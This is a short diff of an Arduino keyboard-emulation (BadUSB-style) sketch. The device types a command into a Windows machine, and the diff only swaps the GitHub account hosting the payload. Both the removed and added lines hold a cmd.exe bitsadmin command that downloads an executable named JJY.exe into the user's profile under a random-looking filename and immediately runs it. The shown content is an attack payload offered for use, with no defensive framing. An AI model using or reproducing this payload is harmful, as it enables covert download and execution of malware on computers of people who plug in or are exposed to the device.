@@ -19,7 +19,7 @@ void setup() {
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();  
     delay(500);
-    Keyboard.print("cmd.exe /c bitsadmin /transfer eH /priority foreground https://github.com/jitterxie/JJY.exe/raw/master/JJY.exe %USERPROFILE%\cXUAQSZZXXCXzx.exe && start %USERPROFILE%\cXUAQSZZXXCXzx.exe");
+    Keyboard.print("cmd.exe /c bitsadmin /transfer eH /priority foreground https://github.com/pxmkv/JJY.exe/raw/master/JJY.exe %USERPROFILE%\cXUAQSZZXXCXzx.exe && start %USERPROFILE%\cXUAQSZZXXCXzx.exe");
     
     Keyboard.press(KEY_RETURN);
     Keyboard.release(KEY_RETURN);
